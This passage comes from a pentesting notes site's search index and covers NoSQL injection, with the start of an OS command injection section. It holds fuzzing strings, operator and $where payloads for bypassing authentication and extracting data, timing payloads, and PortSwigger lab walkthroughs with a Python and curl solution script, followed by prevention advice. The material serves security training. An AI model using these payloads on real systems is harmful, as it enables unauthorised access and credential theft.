domains.</li> </ul> <p>Warning from PortSwigger</p> <p>CORS defines browser behaviors and is never a replacement for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin. Therefore, web servers should continue to apply protections over sensitive data, such as authentication and session management, in addition to properly configured CORS.</p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html","title":"NoSQL Injection","text":"<p>Most of these notes were taken from online sources and/or courses. I'm not that smart to come up with all this on my own. The primary source was PortSwigger. Check out their NoSQL Injection learning path on the Web Security Academy.</p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#overview","title":"Overview","text":"<p>There are two different types of NoSQL injection:</p> <ul> <li>Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.</li> <li>Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.</li> </ul>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#understanding-nosql-structure","title":"Understanding NoSQL Structure","text":""},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#sample-document","title":"Sample Document","text":"<pre><code>{\n  \"_id\": \"some_unique_user_id_123\",\n  \"username\": \"alex_p_dev\",\n  \"email\": \"alex@example.com\",\n  \"followers\": 150,\n  \"isAdmin\": false,\n  \"interests\": [\"pentesting\", \"bug bounties\", \"rock climbing\"]\n}\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#sample-vulnerable-code","title":"Sample Vulnerable Code","text":"<pre><code>// WARNING: VULNERABLE CODE EXAMPLE\nfunction login(userInput_username, userInput_password) {\n  // Build a query by directly inserting user input\n  let query = `{ \"username\": \"` + userInput_username + `\", \"password\": \"` + userInput_password + `\" }`;\n\n  // Find a user in the database that matches this query\n  db.users.find(query);\n}\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#basic-injection-test","title":"Basic Injection Test","text":"<pre><code>{ \"username\": \"admin\", \"password\": {\"$ne\": \"a\"} }\n</code></pre> <p>The database reads this as: \"Find a user where the <code>username</code> is 'admin' AND the <code>password</code> is not equal to 'a'.\"</p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#syntax-injection","title":"Syntax Injection","text":"<p>Syntax injection attempts to break the NoSQL query syntax by injecting malicious payloads.</p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#detection-and-fuzzing","title":"Detection and Fuzzing","text":""},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#sample-fuzzing-string","title":"Sample Fuzzing String","text":"<pre><code>'\"`{ ;$Foo} $Foo \\xYZ\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#url-encoded-fuzzing","title":"URL-Encoded Fuzzing","text":"<pre><code>https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#json-context-fuzzing","title":"JSON Context Fuzzing","text":"<pre><code>'\\\"`{\\r;$Foo}\\n$Foo \\\\xYZ\\u0000\n</code></pre> <p>Tip</p> <p>To figure out which characters are processed, send individual characters to see how the application responds.</p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#confirming-conditional-behavior","title":"Confirming Conditional Behavior","text":"<p>After identifying the vulnerability, try to determine which characters are being processed.</p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#testing-false-conditions","title":"Testing False Conditions","text":"<pre><code>' &amp;&amp; 0 &amp;&amp; 'x\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#testing-true-conditions","title":"Testing True Conditions","text":"<pre><code>' &amp;&amp; 1 &amp;&amp; 'x\n</code></pre> <p>If the application behaves differently, this suggests that the false condition impacts the query logic, but the true condition doesn't. This indicates that injecting this style of syntax impacts a server-side query.</p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#exploiting-syntax-injection","title":"Exploiting Syntax Injection","text":""},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#override-existing-conditions","title":"Override Existing Conditions","text":"<p>Attempt to override existing conditions with custom JavaScript:</p> <pre><code>'||'1'=='1\n</code></pre> <p>Warning</p> <p>Take care when injecting a condition that always evaluates to true into a NoSQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If an application uses it when updating or deleting data, for example, this can result in accidental data loss.</p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#null-character-injection","title":"Null Character Injection","text":"<p>Try injecting a null character after the query:</p> <pre><code>https://insecure-website.com/product/lookup?category=fizzy'%00\n</code></pre> PortSwigger NoSQL Injection Lab 1: Detecting NoSQL injection"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#lab-1-detecting-nosql-injection","title":"Lab 1: Detecting NoSQL injection","text":"<pre><code>GET /filter?category=Pets'%22%60%7B%20%3B%24Foo%7D%20%24Foo%20%5CxYZ HTTP/1.1\nHost: 0a8c001604495d9180c60dd0006c004a.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nConnection: keep-alive\nReferer: https://0a8c001604495d9180c60dd0006c004a.web-security-academy.net/\nCookie: session=d82ldTNqdPOXGQFfW3TXmFcwNInibcG3\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: magenta\nPriority: u=0, i\n</code></pre> <p>This causes an internal server error</p> <pre><code>HTTP/1.1 500 Internal Server Error\nContent-Type: text/html; charset=utf-8\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 2793\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n\n&lt;head&gt;\n    &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;\n    &lt;link href=/resources/css/labs.css rel=stylesheet&gt;\n    &lt;title&gt;Detecting NoSQL injection&lt;/title&gt;\n&lt;/head&gt;\n&lt;script src=\"/resources/labheader/js/labHeader.js\"&gt;&lt;/script&gt;\n&lt;div id=\"academyLabHeader\"&gt;\n    &lt;section class='academyLabBanner'&gt;\n        &lt;div class=container&gt;\n            &lt;div class=logo&gt;&lt;/div&gt;\n            &lt;div class=title-container&gt;\n                &lt;h2&gt;Detecting NoSQL injection&lt;/h2&gt;\n                &lt;a id='lab-link' class='button' href='/'&gt;Back to lab home&lt;/a&gt;\n                &lt;a class=link-back href='https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection'&gt;\n                    Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;description&amp;nbsp;\n                    &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;\n                        &lt;g&gt;\n                            &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;\n                            &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;\n                        &lt;/g&gt;\n                    &lt;/svg&gt;\n                &lt;/a&gt;\n            &lt;/div&gt;\n            &lt;div class='widgetcontainer-lab-status is-notsolved'&gt;\n                &lt;span&gt;LAB&lt;/span&gt;\n                &lt;p&gt;Not solved&lt;/p&gt;\n                &lt;span class=lab-status-icon&gt;&lt;/span&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n&lt;/div&gt;\n&lt;/section&gt;\n&lt;/div&gt;\n&lt;div theme=\"\"&gt;\n    &lt;section class=\"maincontainer\"&gt;\n        &lt;div class=\"container is-page\"&gt;\n            &lt;header class=\"navigation-header\"&gt;\n            &lt;/header&gt;\n            &lt;h4&gt;Internal Server Error&lt;/h4&gt;\n            &lt;p class=is-warning&gt;Command failed with error 139 (JSInterpreterFailure): &amp;apos;SyntaxError: malformed hexadecimal character escape sequence :\n                functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n                &amp;apos; on server 127.0.0.1:27017. The full response is {&amp;quot;ok&amp;quot;: 0.0, &amp;quot;errmsg&amp;quot;: &amp;quot;SyntaxError: malformed hexadecimal character escape sequence :\\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\\n&amp;quot;, &amp;quot;code&amp;quot;: 139, &amp;quot;codeName&amp;quot;: &amp;quot;JSInterpreterFailure&amp;quot;}&lt;/p&gt;\n        &lt;/div&gt;\n    &lt;/section&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre> <p>Note that sending a <code>'</code> character results in an error</p> <p></p> <p>Sending a valid JS payload fixes the error</p> <p></p> <p>Check conditional behavior. Note that when we send a negative conditional, no products are shown</p> <p></p> <p>Warning</p> <p>Make sure to URL encode this</p> <p>Now when we send a truthy value, products are returned.</p> <p></p> <p>Now sending an \"or 1=1\" payload we can get all products listed</p> <p></p> <p>Final payload</p> <pre><code>'||1||'\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#operator-injection","title":"Operator Injection","text":"<p>NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result. Examples of MongoDB query operators include:</p> <ul> <li><code>$where</code>\u00a0- Matches documents that satisfy a JavaScript expression.</li> <li><code>$ne</code>\u00a0- Matches all values that are not equal to a specified value.</li> <li><code>$gt</code> (greater than) and <code>$lt</code> (less than) are perfect. For instance, if you're trying to bypass a check on a numeric field, you could inject <code>{\"$gt\": 0}</code> to match any positive number.</li> <li><code>$in</code> is great for checking against an array of possibilities.</li> <li><code>$regex</code> is extremely powerful, as it lets you perform complex pattern matching. It can be used to slowly reveal data one character at a time.</li> <li><code>$where</code>: This is a very dangerous one. In older versions of MongoDB, it allowed you to pass a JavaScript function to be executed on the server. Finding this is like hitting the jackpot.</li> <li><code>$exists</code>: This checks if a field exists or not, which can be useful for figuring out the database schema.</li> </ul>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#response-analysis","title":"Response Analysis","text":"<p>Sending the payload is only half the battle. A professional pentester needs to carefully observe how the application responds to confirm a vulnerability. You're looking for three main types of clues:</p> <ol> <li> <p>Direct Response / Content Change: This is the easiest to spot. You inject a payload that evaluates to true, and the content of the page changes. For example, you bypass a login and see a \"Welcome, admin!\" message, or a search for <code>\"a'\"</code> returns more results than a search for <code>\"a\"</code>.</p> </li> <li> <p>Error-Based: Sometimes, a bad query will make the database throw an error that gets displayed on the page. This is a huge clue! An error message like <code>unrecognized operator: $foo</code> tells you that the application is trying to pass your input to the database. You know you're on the right track.</p> </li> <li> <p>Time-Based (Blind): This is the most advanced technique. What if the application doesn't change its content or show errors? You can inject a command that tells the database to \"sleep\" or perform a heavy computation if a certain condition is true. If you inject a payload that says, \"If the admin's password starts with 'a', sleep for 5 seconds,\" and the page takes 5 seconds longer to load, you've just learned the first letter of the password. This is called blind injection.</p> </li> </ol>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#basic-operator-injection-techniques","title":"Basic Operator Injection Techniques","text":""},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#get-parameter-injection","title":"GET Parameter Injection","text":"<p>Something like this might work in a URL:</p> <pre><code>username[$ne]=invalid\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#post-json-injection","title":"POST JSON Injection","text":"<p>We can also change GET to POST, and then inject into the body with <code>Content-Type: application/json</code></p> <p>In the JSON body, test whether the username (example) input is processing the query operator:</p> <pre><code>{\"username\":{\"$ne\":\"invalid\"},\"password\":\"peter\"}\n</code></pre> <p>If the <code>$ne</code> operator is applied, then it will query all accounts that do NOT have the username \"invalid\"</p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#authentication-bypass","title":"Authentication Bypass","text":"<p>This could be used to bypass authentication if both the username and password fields process the operator. </p> <p>We can check a list of known usernames:</p> <pre><code>{\"username\":{\"$in\":[\"admin\",\"administrator\",\"superadmin\"]},\"password\":{\"$ne\":\"\"}}\n</code></pre> PortSwigger NoSQL Injection Lab 2: Exploiting NoSQL operator injection to bypass authentication"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#lab-2-exploiting-nosql-operator-injection-to-bypass-authentication","title":"Lab 2: Exploiting NoSQL operator injection to bypass authentication","text":"<p>Original request</p> <p></p> <p>Checking if the username field processes the operator...looks like it does because even though we didn't enter the correct username, we still are able to get logged in as <code>wiener</code></p> <p></p> <p>Checking if the password field also processes it...looks like it also does. Note the response that the query returned an unexpected number of results. </p> <p></p> <p>Using the regex operator we can get logged in as the admin user, which has a random username</p> <p></p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#sample-code-solution","title":"Sample Code Solution","text":""},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#python","title":"Python","text":"<p>This code will solve this challenge</p> <pre><code>import requests\n\nurl = 'https://0a6f00c903ee32228074712400a300a8.web-security-academy.net/login'\n\nheaders = {\n  'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv',\n  'Content-Type': 'application/json',\n  'Cookie': 'session=Oeo2rw4ypJQwM1hYHAsO4yNGTqXwxzJq',\n  'Priority': 'u=0'\n}\n\ndata = {\n  \"username\": {\n    \"$regex\": \"admin*\"\n  },\n  \"password\": {\n    \"$ne\": \"invalid\"\n  }\n}\n\nr = requests.post(url, headers=headers, json=data)\n\nprint(r.status_code)\nprint(r.text)\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#curl","title":"Curl","text":"<pre><code>curl -X POST \\\n    -H 'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv' \\\n    -H 'Content-Type:application/json' \\\n    -H 'Cookie:session=Oeo2rw4ypJQwM1hYHAsO4yNGTqXwxzJq' \\\n    -H 'Priority:u=0' \\\n    -d '{\n  \"username\": {\n    \"$regex\": \"admin*\"\n  },\n  \"password\": {\n    \"$ne\": \"invalid\"\n  }\n}' \\\n    'https://0a6f00c903ee32228074712400a300a8.web-security-academy.net/login'\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#data-extraction-techniques","title":"Data Extraction Techniques","text":""},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#identifying-field-names","title":"Identifying Field Names","text":"<p>It can be difficult to identify field names since NoSQL doesn't require a fixed schema (like SQL), but we can usually infer the existence of a field by the responses:</p> <pre><code>https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'\n</code></pre> <p>Comparing against a known field:</p> <pre><code>admin' &amp;&amp; this.username!='\n</code></pre> <p>and an unknown field:</p> <pre><code>admin' &amp;&amp; this.foo!='\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#extracting-data-with-syntax-injection","title":"Extracting Data with Syntax Injection","text":"<p>If the query is using a <code>$where</code> clause, we can try to inject into that to retrieve sensitive data:</p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#character-by-character-extraction","title":"Character-by-Character Extraction","text":"<pre><code>admin' &amp;&amp; this.password[0] == 'a' || 'a'=='b\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#using-javascript-functions","title":"Using JavaScript Functions","text":"<p>Using the JavaScript <code>match()</code> function:</p> <pre><code>admin' &amp;&amp; this.password.match(/\\d/) || 'a'=='b\n</code></pre> PortSwigger NoSQL Injection Lab 3: Exploiting NoSQL injection to extract data"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#lab-3-exploiting-nosql-injection-to-extract-data","title":"Lab 3: Exploiting NoSQL injection to extract data","text":"<p>PortSwigger NoSQL Injection Lab #3</p> <p>We need to extract the administrator password and log in to solve the lab</p> <p>Confirming that the <code>password</code> field exists</p> <pre><code>GET /user/lookup?user=administrator'+%26%26+this.password!%3d' HTTP/1.1\nHost: 0aa7008b033ca58c807c083c00f8009e.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0aa7008b033ca58c807c083c00f8009e.web-security-academy.net/my-account?id=wiener\nConnection: keep-alive\nCookie: session=QMIuURiqO62GwvlLWRvDsROkHS4k2u5q\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=4\n</code></pre> <pre><code>HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 96\n\n{\n    \"username\": \"administrator\",\n    \"email\": \"admin@normal-user.net\",\n    \"role\": \"administrator\"\n}\n</code></pre> <p>First thing, we need to figure out how long the password is. The following request will return the right response if the condition is true, and will return a user not found error if it's false.</p> <pre><code>GET /user/lookup?user=administrator'%20%26%26%20this.password.length%20%3E%201%20%7C%7C%20'a'%3D%3D'b HTTP/1.1\nHost: 0aa7008b033ca58c807c083c00f8009e.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0aa7008b033ca58c807c083c00f8009e.web-security-academy.net/my-account?id=wiener\nConnection: keep-alive\nCookie: session=QMIuURiqO62GwvlLWRvDsROkHS4k2u5q\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=4\n</code></pre> <p>Running this through automate (intruder, whatever) we see that we get the correct response with <code>this.password.length &gt; 7</code>, but it fails with <code>&gt; 8</code>, so we know the password has 8 characters. </p> <p></p> <p>Now we can tweak the automate settings a bit</p> <p></p> <p></p> <p>Looking at the results we can see it seems to have worked...</p> <p></p> <pre><code>ppycphbs\n</code></pre> <p>That worked to log in as the administrator, and we solved the lab</p> <p></p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#advanced-operator-injection","title":"Advanced Operator Injection","text":""},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#using-where-to-confirm-injection","title":"Using <code>$where</code> to Confirm Injection","text":"<pre><code>{\"username\":\"wiener\",\"password\":\"peter\", \"$where\":\"0\"}\n</code></pre> <pre><code>{\"username\":\"wiener\",\"password\":\"peter\", \"$where\":\"1\"}\n</code></pre> <p>If there's a difference, it could mean the JavaScript in the <code>$where</code> clause is being evaluated.</p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#extracting-field-names-with-keys","title":"Extracting Field Names with <code>keys()</code>","text":"<pre><code>{\"$where\":\"Object.keys(this)[0].match('^.{0}a.*')\"}\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#data-exfiltration-with-operators","title":"Data Exfiltration with Operators","text":"<pre><code>{\"username\":\"admin\",\"password\":{\"$regex\":\"^.*\"}}\n</code></pre> <p>Confirming injection with $regex</p> <p>If the response to this request is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable. You can use the <code>$regex</code> operator to extract data character by character. For example, the following payload checks whether the password begins with an <code>a</code>:</p> <pre><code>{\"username\":\"admin\",\"password\":{\"$regex\":\"^a*\"}}\n</code></pre> PortSwigger NoSQL Injection Lab 4: Exploiting NoSQL operator injection to extract unknown fields <p>We can send the original login request...note the \"Invalid username or password\" message.</p> <pre><code>POST /login HTTP/1.1\nHost: 0aaf00b403c88ba381e42f4700b500d4.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0aaf00b403c88ba381e42f4700b500d4.web-security-academy.net/login\nContent-Type: application/json\nContent-Length: 42\nOrigin: https://0aaf00b403c88ba381e42f4700b500d4.web-security-academy.net\nConnection: keep-alive\nCookie: session=i4eqOjus4JQrGjGabfK4wcmKZO9nu1T6\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=0\n\n{\"username\":\"carlos\",\"password\":\"invalid\"}\n</code></pre> <pre><code>HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 3392\n\n[...SNIP...]\n\n                &lt;section&gt;\n                    &lt;p class=is-warning&gt;Invalid username or password&lt;/p&gt;\n                    &lt;form class=login-form method=POST action=\"/login\"&gt;\n                        &lt;label&gt;Username&lt;/label&gt;\n                        &lt;input required type=username name=\"username\" autofocus&gt;\n                        &lt;label&gt;Password&lt;/label&gt;\n                        &lt;input required type=password name=\"password\"&gt;\n                        &lt;a href=/forgot-password&gt;Forgot password?&lt;/a&gt;\n                        &lt;br /&gt;\n                        &lt;button class=button onclick=\"event.preventDefault(); jsonSubmit('/login')\"&gt; Log in &lt;/button&gt;\n                        &lt;script src='/resources/js/login.js'&gt;&lt;/script&gt;\n                    &lt;/form&gt;\n                &lt;/section&gt;\n</code></pre> <p>Now we can use a <code>$where</code> clause to compare results. First with a false value:</p> <pre><code>{\"username\":\"carlos\",\"password\":{\"$ne\":\"invalid\"}, \"$where\":\"0\"}\n</code></pre> <p></p> <p>And then with a true value:</p> <pre><code>{\"username\":\"carlos\",\"password\":{\"$ne\":\"invalid\"}, \"$where\":\"1\"}\n</code></pre> <p></p> <p>Note the change in the response. There's now an \"Account locked: please reset your password\" message instead of the invalid credentials error. </p> <p>Now we can use <code>keys()</code> to identify all the fields on the user object.</p> <pre><code>{\"username\":\"carlos\",\"password\":{\"$ne\":\"invalid\"}, \"$where\":\"Object.keys(this)[1].match('^.{}.*')\"}\n</code></pre> <p></p> <p></p> <p>Running this shows the first field is \"username\".</p> <p></p> <p>Now switching the key index from \"1\" to \"2\", we see that the next key is \"password\"</p> <p></p> <p>Number three is \"email\"</p> <p></p> <p>Four returns errors. I eventually figured out that this only works if you generate a password reset for carlos first. After generating a password reset request for carlos and re-running this, we see that there's now a field <code>newPwdTkn</code></p> <p></p> <p>Now, when we submit this to the <code>/forgot-password</code> endpoint in the GET request, we get the \"Invalid token error\". </p> <p></p> <p>Now that we have the name of the field, it's possible to brute force that value the same way as the others.</p> <pre><code>{\"username\":\"carlos\",\"password\":{\"$ne\":\"invalid\"}, \"$where\":\"this.newPwdTkn.match('^.{\u00a7\u00a7}\u00a7\u00a7.*')\"}\n</code></pre> <p></p> <p>When we do that we get: <code>f985d7e05a11df73</code>. When we send that request, we're able to reset carlos' password</p> <pre><code>GET /forgot-password?newPwdTkn=f985d7e05a11df73 HTTP/1.1\nHost: 0a20007604e914df807e7b9d004c00da.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nConnection: keep-alive\nReferer: https://0a20007604e914df807e7b9d004c00da.web-security-academy.net/login\nCookie: session=fuemSpbHDnaLWqhjYdNdEbh4RLhwtxGa\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: magenta\nPriority: u=0, i\n</code></pre> <p>After resetting the password we can log in as carlos and solve the lab</p> <p></p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#timing-based-attacks-blind-injection","title":"Timing-Based Attacks (Blind Injection)","text":"<p>Timing-based attacks are useful when the application doesn't return different content or show error messages. You can trigger a time delay under certain conditions to extract data.</p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#basic-timing-payloads","title":"Basic Timing Payloads","text":""},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#using-while-loop-for-delays","title":"Using <code>while</code> Loop for Delays","text":"<pre><code>admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]===\"a\") &amp;&amp; waitTill &gt; new Date()){};}(this)+'\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#using-sleep-function","title":"Using <code>sleep</code> Function","text":"<pre><code>admin'+function(x){if(x.password[0]===\"a\"){sleep(5000)};}(this)+'\n</code></pre> <p>These payloads will cause a 5-second delay if the first character of the password is \"a\", allowing you to extract data character by character.</p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#prevention","title":"Prevention","text":"<ul> <li> <p>Strict Input Validation (Whitelisting): This is the single most important defense. The application should never trust user input. Instead of trying to remove bad characters (blacklisting), it's far safer to only allow known good characters (whitelisting). More importantly, the code should perform type-checking. If the application expects a username (a string), it should reject any input that is an object (like <code>{\"$ne\": null}</code>). If it expects an age (a number), it should reject strings.</p> </li> <li> <p>Use an Object-Document Mapper (ODM): ODMs are libraries (like Mongoose for Node.js/MongoDB) that act as a middle layer between the application and the database. They allow developers to work with data as programming objects rather than raw database queries. A well-built ODM often handles sanitization and parameterization automatically, making it much harder to introduce an injection flaw.</p> </li> <li> <p>Principle of Least Privilege: The user account that the web application uses to connect to the database should have the minimum permissions necessary. For example, if a part of your application only needs to read user profiles, its database account shouldn't have permission to delete them. This won't prevent an injection, but it dramatically limits the damage an attacker can do if they find one.</p> </li> </ul>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#practice-resources","title":"Practice Resources","text":"<p>Here are 4 excellent and free resources where you can safely and legally practice NoSQL injection. Most of these are easily run locally using Docker.</p>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#1-owasp-juice-shop","title":"1. OWASP Juice Shop","text":"<ul> <li>What it is: This is probably the most popular modern web application for security training. It's an intentionally insecure web shop full of vulnerabilities, including several NoSQL injection challenges. The challenges range from basic login bypasses to more advanced data exfiltration.</li> <li>Why it's great: It puts the vulnerabilities in the context of a real-world application. You have to find the vulnerable input fields first before you can exploit them.</li> <li>How to get it: It has an official Docker image that is incredibly easy to run. Just search for <code>owasp/juice-shop</code> on Docker Hub or follow the simple instructions on their official site.</li> </ul>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#2-portswigger-web-security-academy","title":"2. PortSwigger Web Security Academy","text":"<ul> <li>What it is: This is a free, online learning platform created by the makers of Burp Suite. It provides dozens of high-quality, interactive labs that target specific vulnerabilities.</li> <li>Why it's great: Their NoSQL injection labs are fantastic. They walk you through detecting the vulnerability, bypassing logins, and even exploiting syntax variations. It's all browser-based, so there's no local setup required.</li> <li>How to get it: Simply register for a free account on the PortSwigger website to get access to all the labs.</li> </ul>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#3-nosqlgoat","title":"3. NoSQLGoat","text":"<ul> <li>What it is: This is a project from OWASP specifically designed to be a vulnerable-by-design application for learning NoSQL injection. It's less of a broad \"find the vulnerability\" game and more of a focused shooting range for NoSQLi.</li> <li>Why it's great: It's hyper-focused on our topic. It covers a wide variety of injection types and scenarios related to MongoDB.</li> <li>How to get it: It's available on GitHub and can be easily deployed using the provided Docker instructions.</li> </ul>"},{"location":"references/cheatsheets/injection-attacks/NoSQL/index.html#4-hack-the-box-tryhackme","title":"4. Hack The Box &amp; TryHackMe","text":"<ul> <li>What they are: These are online platforms where you can hack into retired, realistic machines in a CTF (Capture The Flag) style. They aren't just single web apps, but often entire virtual machines with multiple services.</li> <li>Why they're great: They provide the most realistic practice. You'll find NoSQL injection vulnerabilities as part of a larger chain of exploitation needed to compromise a system. Many retired machines and dedicated learning \"rooms\" on these platforms feature NoSQLi.</li> <li>How to get it: Both platforms operate on a \"freemium\" model. You can access many retired machines and learning paths for free, with an optional subscription for more content.</li> </ul>"},{"location":"references/cheatsheets/injection-attacks/OS-command-injection/index.html","title":"Command Injection","text":"<p>OS command injection allows an attacker to execute commands on the host (underlying server) operating system, and in some cases could result in the attacker assuming full control of the server. </p> <p>If the application doesn't implement any protections or user input validation, the attacker may be able to manipulate the underlying server command to execute arbitrary shell commands. </p>"},{"location":"references/cheatsheets/injection-attacks/OS-command-injection/index.html#simple-injection","title":"Simple injection","text":"<p>The basic example from PortSwigger is:</p> <pre><code>&amp; echo aiwefwlguh &amp;\n</code></pre> PortSwigger OS Injection Lab 1: OS command injection, simple case <p>Here we've got an application that performs a stock lookup using a shell script on the underlying server. There are no user input protections in place. </p> <p></p> <p>The request looks like this:</p> <pre><code>POST /product/stock HTTP/1.1\nHost: 0aab00a504ea896e81f0168900c60006.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0aab00a504ea896e81f0168900c60006.web-security-academy.net/product?productId=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 21\nOrigin: https://0aab00a504ea896e81f0168900c60006.web-security-academy.net\nConnection: keep-alive\nCookie: session=vvWuL2C5s8LQyofZUKKmcbiWpd2ntO4k\nSec-Fetch-Dest: 